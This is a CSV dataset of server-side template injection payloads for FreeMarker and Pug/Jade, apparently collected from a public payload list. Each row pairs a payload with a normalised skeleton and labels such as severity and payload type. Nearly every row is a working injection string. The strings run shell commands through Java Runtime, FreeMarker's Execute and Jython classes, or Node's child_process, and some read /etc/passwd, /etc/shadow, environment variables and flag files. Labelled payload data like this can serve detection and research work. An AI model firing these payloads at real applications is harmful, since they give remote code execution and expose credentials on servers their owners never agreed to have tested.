"${""freemarker.template.utility.ObjectConstructor""?new()(""java.lang.ProcessBuilder"",[""powershell"",""-c"",""whoami""]).start()}","${""S""?new()(""S"",[""S"",""S"",""S""]).start()}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.Runtime"").getRuntime().exec(""id"")}","${value(""S"").getruntime().exec(""S"")}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.Runtime"").getRuntime().exec(""whoami"")}","${value(""S"").getruntime().exec(""S"")}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${value(""java.lang.Runtime"").getRuntime().exec(""cat /etc/passwd"")}","${value(""S"").getruntime().exec(""S"")}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.Execute""?new()(request.getParameter(""cmd""))}","${""S""?new()(request.getparameter(""S""))}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${ex(request.getParameter(""cmd""))}","${ex(request.getparameter(""S""))}",java,FreeMarker,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
${ex(.data_model.cmd)},${ex(.data_model.cmd)},java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.JythonRuntime""?new().exec(""import os;os.system('id')"")}","${""S""?new().exec(""S"")}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${""freemarker.template.utility.JythonRuntime""?new().eval(""__import__('os').system('id')"")}","${""S""?new().eval(""S"")}",java,FreeMarker,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${jython.exec(""import os;os.system('id')"")}","${jython.exec(""S"")}",java,FreeMarker,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"${jython.eval(""__import__('os').system('id')"")}","${jython.eval(""S"")}",java,FreeMarker,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#setting url_escaping_charset=""UTF-8"">","<#settingurl_escaping_charset=""S"">",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
"<#setting output_encoding=""UTF-8"">","<#settingoutput_encoding=""S"">",java,FreeMarker,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/freemarker.txt
#{7*'7'},#{N*'S'},javascript,Pug/Jade,1,high,probe,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global},#{global},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process},#{process},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root},#{root},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{self},#{self},javascript,Pug/Jade,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process},#{global.process},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule},#{process.mainmodule},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require},#{process.mainmodule.require},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process')},#{process.mainmodule.require('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('id')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('whoami')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('cat /etc/passwd')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('ls -la')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('uname -a')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('pwd')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('env')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('cat flag.txt')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('ps aux')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('ifconfig')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('netstat -an')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').exec('cat /etc/shadow')},#{process.mainmodule.require('S').exec('S')},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('whoami').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('ls -la').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('uname -a').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('pwd').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('env').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').execSync('cat flag.txt').toString()},#{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').spawnSync('id').stdout.toString()},#{process.mainmodule.require('S').spawnsync('S').stdout.tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('child_process').spawnSync('whoami').stdout.toString()},#{process.mainmodule.require('S').spawnsync('S').stdout.tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('cat',['/etc/passwd']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('ls',['-la']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('child_process').spawnSync('uname',['-a']).stdout.toString()}","#{process.mainmodule.require('S').spawnsync('S',['S']).stdout.tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('child_process').execSync('id').toString()},#{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('child_process').execSync('whoami').toString()},#{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()},#{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('child_process').execSync('ls -la').toString()},#{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','id'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}","#{process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','whoami'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}","#{process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.binding('spawn_sync').spawn({file:'/bin/sh',args:['/bin/sh','-c','cat /etc/passwd'],stdio:[{type:'pipe',readable:1,writable:1}]}).output[1].toString()}","#{process.binding('S').spawn({file:'S',args:['S','S','S'],stdio:[{type:'S',readable:N,writable:N}]}).output[N].tostring()}",javascript,Pug/Jade,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env},#{process.env},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env.PATH},#{process.env.path},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env.HOME},#{process.env.home},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env.USER},#{process.env.user},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.env.SHELL},#{process.env.shell},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.version},#{process.version},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.versions},#{process.versions},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.platform},#{process.platform},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.arch},#{process.arch},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.release},#{process.release},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.config},#{process.config},javascript,Pug/Jade,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.pid},#{process.pid},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.ppid},#{process.ppid},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.cwd()},#{process.cwd()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.execPath},#{process.execpath},javascript,Pug/Jade,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.argv},#{process.argv},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.execArgv},#{process.execargv},javascript,Pug/Jade,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.memoryUsage()},#{process.memoryusage()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.uptime()},#{process.uptime()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.env},#{global.process.env},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.version},#{global.process.version},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.platform},#{global.process.platform},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.cwd()},#{global.process.cwd()},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root.process},#{root.process},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root.process.mainModule},#{root.process.mainmodule},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root.process.mainModule.require},#{root.process.mainmodule.require},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{root.process.mainModule.require('child_process').execSync('id').toString()},#{root.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{global.process.mainModule.require('child_process').execSync('id').toString()},!{global.process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('whoami').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('ls -la').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('uname -a').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('pwd').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('env').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('child_process').execSync('cat flag.txt').toString()},!{process.mainmodule.require('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}","#{process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{process.mainModule.require('fs').readFileSync('flag.txt','utf8')}","#{process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('fs').readdirSync('/')},#{process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.require('fs').readdirSync('.')},#{process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}","!{process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"!{process.mainModule.require('fs').readFileSync('flag.txt','utf8')}","!{process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('fs').readdirSync('/')},!{process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
!{process.mainModule.require('fs').readdirSync('.')},!{process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{global.process.mainModule.require('fs').readFileSync('/etc/passwd','utf8')}","#{global.process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
"#{global.process.mainModule.require('fs').readFileSync('flag.txt','utf8')}","#{global.process.mainmodule.require('S').readfilesync('S','S')}",javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{global.process.mainModule.require('fs').readdirSync('/')},#{global.process.mainmodule.require('S').readdirsync('S')},javascript,Pug/Jade,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('child_process').execSync('id').toString()},#{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
#{process.mainModule.constructor._load('child_process').execSync('whoami').toString()},#{process.mainmodule.constructor._load('S').execsync('S').tostring()},javascript,Pug/Jade,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/pug-jade.txt
